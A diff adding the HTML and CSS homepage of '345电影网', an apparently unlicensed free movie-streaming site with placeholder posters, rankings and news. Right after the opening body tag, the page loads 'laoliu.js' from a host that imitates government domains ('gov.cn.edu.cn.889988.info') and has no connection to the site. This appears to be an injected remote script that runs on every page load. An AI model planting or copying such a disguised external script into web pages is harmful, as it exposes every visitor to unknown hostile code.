@@ -1,0 +1,249 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>345电影网 - 全网影视资源在线观看</title>
+<meta name="description" content="345电影网提供海量高清电影、电视剧、动漫、综艺在线免费观看，资源全、更新快、播放稳。">
+<meta name="keywords" content="345电影网,电影在线观看,高清影视,免费电影,电视剧">
+<style>
+/* ===== Reset ===== */
+* { margin:0; padding:0; box-sizing:border-box; font-family:"Segoe UI","Microsoft YaHei",sans-serif; }
+body { background:#070b19; color:#d7e2f2; line-height:1.6; overflow-x:hidden; }
+a { color:inherit; text-decoration:none; }
+img { max-width:100%; display:block; }
+
+/* ===== 侧边导航 ===== */
+.layout { display:flex; min-height:100vh; }
+.sidebar {
+    width:220px; background:linear-gradient(180deg,#0a1230,#070b19);
+    padding:30px 18px; position:sticky; top:0; height:100vh; overflow-y:auto;
+}
+.sidebar .logo { font-size:26px; font-weight:900; color:#00e5ff; margin-bottom:8px; }
+.sidebar .logo small { display:block; font-size:12px; color:#6b7ea8; font-weight:400; margin-top:4px; }
+.side-menu { margin-top:30px; }
+.side-menu a {
+    display:block; padding:12px 14px; margin-bottom:6px; border-radius:8px;
+    color:#9fb0d0; transition:.3s; font-size:15px;
+}
+.side-menu a:hover { background:rgba(0,229,255,.12); color:#00e5ff; padding-left:20px; }
+
+/* ===== 主内容区 ===== */
+.main { flex:1; padding:0 0 40px; }
+.topbar {
+    padding:18px 30px; background:rgba(10,18,48,.8); backdrop-filter:blur(8px);
+    display:flex; justify-content:space-between; align-items:center; position:sticky; top:0; z-index:100;
+}
+.search-box {
+    background:rgba(255,255,255,.06); border:1px solid rgba(0,229,255,.3);
+    padding:8px 16px; border-radius:24px; color:#fff; width:260px; font-size:14px;
+}
+
+/* ===== Banner ===== */
+.banner {
+    margin:24px 30px; border-radius:16px; overflow:hidden; position:relative;
+    background:url('https://images.unsplash.com/photo-1440404653325-ab127d49abc1?auto=format&fit=crop&w=1600&q=80') center/cover;
+    min-height:320px; display:flex; align-items:center; padding:40px;
+}
+.banner::before { content:""; position:absolute; inset:0; background:linear-gradient(90deg,rgba(7,11,25,.95),transparent); }
+.banner-text { position:relative; z-index:2; max-width:500px; }
+.banner-text h1 { font-size:34px; color:#fff; margin-bottom:14px; }
+.banner-text p { color:#a9c0e8; margin-bottom:20px; }
+.btn-main {
+    display:inline-block; background:#00e5ff; color:#070b19; padding:12px 28px;
+    border-radius:26px; font-weight:700; transition:.3s;
+}
+.btn-main:hover { background:#00b8d4; }
+
+/* ===== 栏目通用 ===== */
+.section { padding:0 30px; margin-top:44px; }
+.sec-head { display:flex; align-items:center; justify-content:space-between; margin-bottom:18px; }
+.sec-head h2 { font-size:22px; color:#fff; }
+.sec-head h2::before { content:""; display:inline-block; width:4px; height:20px; background:#00e5ff; margin-right:10px; vertical-align:middle; border-radius:2px; }
+.sec-head a { font-size:13px; color:#00e5ff; }
+
+/* 栏目1：热播推荐 - 横向滚动 */
+.h-scroll { display:flex; gap:16px; overflow-x:auto; padding-bottom:12px; scroll-snap-type:x mandatory; }
+.h-scroll::-webkit-scrollbar { height:8px; }
+.h-scroll::-webkit-scrollbar-thumb { background:#1c2a55; border-radius:4px; }
+.film-card { flex:0 0 180px; scroll-snap-align:start; cursor:pointer; }
+.film-card .poster { height:250px; border-radius:12px; overflow:hidden; position:relative; }
+.film-card .poster img { width:100%; height:100%; object-fit:cover; transition:.4s; }
+.film-card:hover .poster img { transform:scale(1.08); }
+.film-card .poster::after { content:""; position:absolute; inset:0; background:linear-gradient(0deg, rgba(0,0,0,.8), transparent 50%); }
+.film-card h4 { margin-top:10px; font-size:15px; color:#fff; }
+.film-card span { font-size:12px; color:#6b7ea8; }
+
+/* 栏目2：电影分类 - 大图磁贴 */
+.cat-grid { display:grid; grid-template-columns:2fr 1fr 1fr; grid-template-rows:160px 160px; gap:14px; }
+.cat-tile { border-radius:14px; padding:22px; position:relative; overflow:hidden; display:flex; flex-direction:column; justify-content:flex-end; cursor:pointer; transition:.3s; }
+.cat-tile:hover { transform:translateY(-4px); }
+.cat-tile h3 { color:#fff; font-size:19px; position:relative; z-index:2; }
+.cat-tile p { color:#d7e2f2; font-size:13px; position:relative; z-index:2; opacity:.85; }
+.cat-tile::before { content:""; position:absolute; inset:0; background:linear-gradient(135deg,var(--c1),var(--c2)); opacity:.9; }
+.cat-tile:nth-child(1) { grid-row:span 2; --c1:#0f4c75;--c2:#00e5ff; }
+.cat-tile:nth-child(2) { --c1:#7b2d8e;--c2:#e040fb; }
+.cat-tile:nth-child(3) { --c1:#c2185b;--c2:#ff5252; }
+.cat-tile:nth-child(4) { --c1:#2e7d32;--c2:#69f0ae; }
+.cat-tile:nth-child(5) { --c1:#e65100;--c2:#ffb74d; }
+
+/* 栏目3：热播榜单 - 表格 */
+.rank-table { width:100%; border-collapse:collapse; background:rgba(255,255,255,.02); border-radius:14px; overflow:hidden; }
+.rank-table th { text-align:left; padding:14px 18px; color:#6b7ea8; font-size:13px; border-bottom:1px solid #1c2a55; }
+.rank-table td { padding:14px 18px; border-bottom:1px solid rgba(28,42,85,.5); color:#d7e2f2; font-size:14px; }
+.rank-table tr:hover td { background:rgba(0,229,255,.05); }
+.rank-table .no { color:#00e5ff; font-weight:900; width:50px; }
+
+/* 栏目4：最新资讯 - 左右交错 */
+.news-list { display:flex; flex-direction:column; gap:18px; }
+.news-item { display:flex; gap:20px; background:rgba(255,255,255,.03); border-radius:14px; padding:16px; align-items:center; transition:.3s; }
+.news-item:nth-child(even) { flex-direction:row-reverse; }
+.news-item:hover { background:rgba(0,229,255,.06); }
+.news-item img { width:160px; height:100px; border-radius:10px; object-fit:cover; flex-shrink:0; }
+.news-item h4 { color:#fff; font-size:16px; margin-bottom:8px; }
+.news-item p { font-size:13px; color:#8a9bc0; }
+
+/* 栏目5：关于我们 */
+.about { background:linear-gradient(135deg,rgba(0,229,255,.08),rgba(28,42,85,.4)); border-radius:16px; padding:34px; }
+.about h2 { color:#00e5ff; margin-bottom:14px; font-size:22px; }
+.about p { color:#a9c0e8; margin-bottom:12px; }
+
+/* ===== Footer ===== */
+.footer { margin-top:50px; padding:28px 30px; background:#050810; text-align:center; color:#5a6b8f; font-size:13px; }
+.footer a { color:#00e5ff; }
+
+/* ===== 响应式 ===== */
+@media (max-width:900px) {
+    .layout { flex-direction:column; }
+    .sidebar { width:100%; height:auto; position:relative; padding:16px; }
+    .side-menu { display:flex; flex-wrap:wrap; margin-top:14px; }
+    .side-menu a { margin:4px; font-size:14px; }
+    .topbar { padding:14px; }
+    .search-box { width:160px; }
+    .banner { margin:14px; padding:24px; min-height:260px; }
+    .banner-text h1 { font-size:24px; }
+    .section { padding:0 14px; }
+    .cat-grid { grid-template-columns:1fr 1fr; grid-template-rows:auto; }
+    .cat-tile:nth-child(1) { grid-row:span 1; grid-column:span 2; height:160px; }
+    .news-item, .news-item:nth-child(even) { flex-direction:column; align-items:flex-start; }
+    .news-item img { width:100%; height:160px; }
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<div class="layout">
+
+    <!-- 侧边导航 -->
+    <aside class="sidebar">
+        <div class="logo">345电影网<small>345DIANYINGWANG</small></div>
+        <nav class="side-menu">
+            <a href="#">首页</a>
+            <a href="#">热播推荐</a>
+            <a href="#">电影分类</a>
+            <a href="#">热播榜单</a>
+            <a href="#">最新资讯</a>
+            <a href="#">关于我们</a>
+        </nav>
+    </aside>
+
+    <!-- 主内容 -->
+    <div class="main">
+
+        <div class="topbar">
+            <div style="color:#8a9bc0;font-size:14px;">全网高清影视 · 免费在线观看</div>
+            <input class="search-box" placeholder="搜索电影 / 电视剧...">
+        </div>
+
+        <!-- Banner -->
+        <section class="banner">
+            <div class="banner-text">
+                <h1>345电影网<br>海量影视一网打尽</h1>
+                <p>院线大片、热播剧集、经典动漫、综艺娱乐，每日更新，极速播放。</p>
+                <a href="#" class="btn-main">立即观看</a>
+            </div>
+        </section>
+
+        <!-- 栏目1：热播推荐 -->
+        <section class="section">
+            <div class="sec-head"><h2>热播推荐</h2><a href="#">查看更多 ›</a></div>
+            <div class="h-scroll">
+                <div class="film-card"><div class="poster"><img src="https://images.unsplash.com/photo-1536440136628-849c177e76a1?w=400&q=80"></div><h4>热播影片一</h4><span>动作 · 2024</span></div>
+                <div class="film-card"><div class="poster"><img src="https://images.unsplash.com/photo-1524985069026-ddb1d3e1b1a4?w=400&q=80"></div><h4>热播影片二</h4><span>科幻 · 2024</span></div>
+                <div class="film-card"><div class="poster"><img src="https://images.unsplash.com/photo-1542204165-65bf26472b9b?w=400&q=80"></div><h4>热播影片三</h4><span>爱情 · 2024</span></div>
+                <div class="film-card"><div class="poster"><img src="https://images.unsplash.com/photo-1517604931442-7e0c8ed2963c?w=400&q=80"></div><h4>热播影片四</h4><span>悬疑 · 2024</span></div>
+                <div class="film-card"><div class="poster"><img src="https://images.unsplash.com/photo-1489593908472-4d1a72d5d1b9?w=400&q=80"></div><h4>热播影片五</h4><span>喜剧 · 2024</span></div>
+                <div class="film-card"><div class="poster"><img src="https://images.unsplash.com/photo-1440404653325-ab127d49abc1?w=400&q=80"></div><h4>热播影片六</h4><span>剧情 · 2024</span></div>
+            </div>
+        </section>
+
+        <!-- 栏目2：电影分类 -->
+        <section class="section">
+            <div class="sec-head"><h2>电影分类</h2><a href="#">全部 ›</a></div>
+            <div class="cat-grid">
+                <div class="cat-tile"><h3>动作片</h3><p>热血激战</p></div>
+                <div class="cat-tile"><h3>科幻片</h3><p>脑洞大开</p></div>
+                <div class="cat-tile"><h3>爱情片</h3><p>甜蜜治愈</p></div>
+                <div class="cat-tile"><h3>悬疑片</h3><p>烧脑反转</p></div>
+                <div class="cat-tile"><h3>喜剧片</h3><p>欢乐解压</p></div>
+            </div>
+        </section>
+
+        <!-- 栏目3：热播榜单 -->
+        <section class="section">
+            <div class="sec-head"><h2>热播榜单</h2><a href="#">完整榜单 ›</a></div>
+            <table class="rank-table">
+                <thead><tr><th>排名</th><th>影片名称</th><th>类型</th><th>热度</th></tr></thead>
+                <tbody>
+                    <tr><td class="no">01</td><td>排行榜影片一</td><td>动作</td><td>🔥 9.8</td></tr>
+                    <tr><td class="no">02</td><td>排行榜影片二</td><td>科幻</td><td>🔥 9.5</td></tr>
+                    <tr><td class="no">03</td><td>排行榜影片三</td><td>爱情</td><td>🔥 9.2</td></tr>
+                    <tr><td class="no">04</td><td>排行榜影片四</td><td>悬疑</td><td>🔥 9.0</td></tr>
+                    <tr><td class="no">05</td><td>排行榜影片五</td><td>喜剧</td><td>🔥 8.8</td></tr>
+                </tbody>
+            </table>
+        </section>
+
+        <!-- 栏目4：最新资讯 -->
+        <section class="section">
+            <div class="sec-head"><h2>最新资讯</h2><a href="#">更多 ›</a></div>
+            <div class="news-list">
+                <div class="news-item">
+                    <img src="https://images.unsplash.com/photo-1489593908472-4d1a72d5d1b9?w=400&q=80">
+                    <div><h4>院线大片最新上线公告</h4><p>多部院线热门影片已同步更新，支持高清在线播放，欢迎观看。</p></div>
+                </div>
+                <div class="news-item">
+                    <img src="https://images.unsplash.com/photo-1536440136628-849c177e76a1?w=400&q=80">
+                    <div><h4>经典老片修复版上线</h4><p>多部经典影片4K修复版本已加入资源库，重温光影记忆。</p></div>
+                </div>
+                <div class="news-item">
+                    <img src="https://images.unsplash.com/photo-1524985069026-ddb1d3e1b1a4?w=400&q=80">
+                    <div><h4>网站播放体验全面升级</h4><p>优化播放线路，提升加载速度，告别卡顿与广告干扰。</p></div>
+                </div>
+            </div>
+        </section>
+
+        <!-- 栏目5：关于我们 -->
+        <section class="section">
+            <div class="sec-head"><h2>关于我们</h2></div>
+            <div class="about">
+                <h2>345电影网简介</h2>
+                <p>345电影网（345dianyingwang-h5）是一个专注于高清电影、热播剧集、动漫综艺在线观看的影视资源平台。</p>
+                <p>我们致力于为用户提供免费、极速、稳定的影视播放体验，资源每日更新，分类清晰，检索便捷。</p>
+                <p>网站名称：<strong style="color:#fff;">345电影网</strong> ｜ 网站网址：<a href="https://345dianyingwang-h5.github.io">https://345dianyingwang-h5.github.io</a></p>
+            </div>
+        </section>
+
+        <!-- Footer -->
+        <footer class="footer">
+            <p>© 2024 345电影网 | 网站名称：345电影网 | 网址：<a href="https://345dianyingwang-h5.github.io">https://345dianyingwang-h5.github.io</a></p>
+            <p>本站仅提供影视信息展示，所有资源均来自互联网，如有侵权请联系我们删除。</p>
+        </footer>
+
+    </div>
+</div>
+
+</body>
+</html>
